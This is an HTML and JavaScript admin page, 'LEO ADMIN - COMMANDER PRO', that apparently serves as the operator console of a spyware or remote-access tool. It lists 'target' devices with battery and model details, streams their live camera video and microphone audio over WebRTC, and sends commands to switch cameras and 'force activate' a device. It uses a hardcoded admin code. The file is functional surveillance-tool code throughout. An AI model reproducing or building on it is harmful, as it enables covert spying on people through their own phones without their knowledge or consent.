<!DOCTYPE html>
<html>
<head>
    <title>LEO ADMIN - COMMANDER PRO</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        :root { --blue: #00d4ff; --dark: #050a14; --panel: #0a192f; --neon: #00ff9d; }
        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; }
        
        /* Sidebar */
        .sidebar { width: 300px; background: var(--panel); padding: 20px; border-right: 1px solid #1e3a8a; }
        .user-item { background: #112240; padding: 15px; margin: 12px 0; border-radius: 12px; cursor: pointer; border: 1px solid transparent; transition: 0.3s; position: relative; }
        .user-item.active { border-color: var(--blue); box-shadow: 0 0 15px rgba(0,212,255,0.3); }
        .status-dot { height: 8px; width: 8px; border-radius: 50%; display: inline-block; position: absolute; right: 15px; top: 15px; }

        /* Main View */
        .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px; background: radial-gradient(circle, #0a192f, #050a14); }
        .video-wrapper { width: 100%; max-width: 850px; aspect-ratio: 16/9; background: #000; border: 2px solid var(--blue); border-radius: 20px; overflow: hidden; position: relative; }
        video { width: 100%; height: 100%; object-fit: contain; }
        
        /* Buttons Grid */
        .controls { margin-top: 25px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; width: 100%; max-width: 500px; }
        .btn { background: #112240; border: 1px solid var(--blue); color: var(--blue); padding: 14px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 0.85rem; letter-spacing: 1px; }
        .btn:hover { background: var(--blue); color: var(--dark); }
        .btn-wake { background: var(--neon); color: #000; border: none; grid-column: span 2; box-shadow: 0 0 15px rgba(0,255,157,0.4); }
        
        #audio-btn { position: absolute; bottom: 20px; right: 20px; background: #ff4444; color: white; padding: 10px 20px; border-radius: 50px; cursor: pointer; }
    </style>
</head>
<body>

    <div class="sidebar">
        <h2 style="color: var(--blue); font-size: 1.2rem;">âš¡ COMMAND CENTER</h2>
        <div id="user-list"></div>
    </div>
    <div class="main">
        <div style="width:100%; display:flex; justify-content:space-between; margin-bottom:10px; font-size:0.8rem; color:#8892b0;">
            <div>STATUS: <span id="sys-st" style="color:var(--neon);">HUB LINK ACTIVE</span></div>
            <div>TARGET ID: <span id="cur-id" style="color:var(--blue);">---</span></div>
        </div>

        <div class="video-wrapper">
            <video id="remoteVideo" autoplay playsinline></video>
            <div id="audio-btn" onclick="unmute()">ðŸ”Š UNMUTE AUDIO</div>
        </div>

        <div class="controls">
            <!-- TERA NAYA WAKE UP BUTTON -->
            <button class="btn btn-wake" onclick="sendCommand('wake-up')">âš¡ FORCE ACTIVATE DEVICE</button>
            
            <button class="btn" onclick="sendCommand('front')">FRONT CAMERA</button>
            <button class="btn" onclick="sendCommand('back')">BACK CAMERA</button>
            <button class="btn" onclick="sendCommand('start')">REFRESH STREAM</button>
            <button class="btn" style="color:#ff4444; border-color:#ff4444;" onclick="location.reload()">FULL HUB RESET</button>
        </div>
    </div>

    <script>
        const socket = io();
        let currentId = null, pc;
        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };

        socket.emit('admin-join', "0000");

        socket.on('update-targets', (list) => {
            const container = document.getElementById('user-list');
            container.innerHTML = "";
            list.forEach(t => {
                const div = document.createElement('div');
                div.className = `user-item ${currentId === t.id ? 'active' : ''}`;
                div.innerHTML = `<strong>Device_${t.id.substring(0,4)}</strong><br>
                                 <small style="color:#8892b0;">Bat: ${t.battery} | ${t.device}</small>
                                 <span class="status-dot" style="background:${t.status==='online'?'#00ff00':'#ff4444'}"></span>`;
                div.onclick = () => select(t.id);
                container.appendChild(div);
            });
        });
        async function select(id) {
            currentId = id; document.getElementById('cur-id').innerText = id.substring(0,6);
            if(pc) pc.close();
            pc = new RTCPeerConnection(config);
            pc.onicecandidate = (e) => { if(e.candidate) socket.emit('signal', { to: currentId, signal: { candidate: e.candidate } }); };
            pc.ontrack = (e) => { document.getElementById('remoteVideo').srcObject = e.streams[0]; };
            socket.emit('command', { targetId: currentId, cmd: 'start' });
        }

        function unmute() { const v = document.getElementById('remoteVideo'); v.muted = false; v.play(); document.getElementById('audio-btn').style.display='none'; }
        
        function sendCommand(c) { 
            if(!currentId) return alert("SELECT DEVICE FIRST!");
            socket.emit('command', { targetId: currentId, cmd: c }); 
        }

        socket.on('signal', async (d) => {
            if(d.from !== currentId) return;
            if(d.signal.sdp) {
                await pc.setRemoteDescription(new RTCSessionDescription(d.signal.sdp));
                if(d.signal.sdp.type === 'offer') {
                    const ans = await pc.createAnswer();
                    await pc.setLocalDescription(ans);
                    socket.emit('signal', { to: d.from, signal: { sdp: ans } });
                }
            } else if(d.signal.candidate) pc.addIceCandidate(new RTCIceCandidate(d.signal.candidate));
        });
    </script>
</body>
</html>
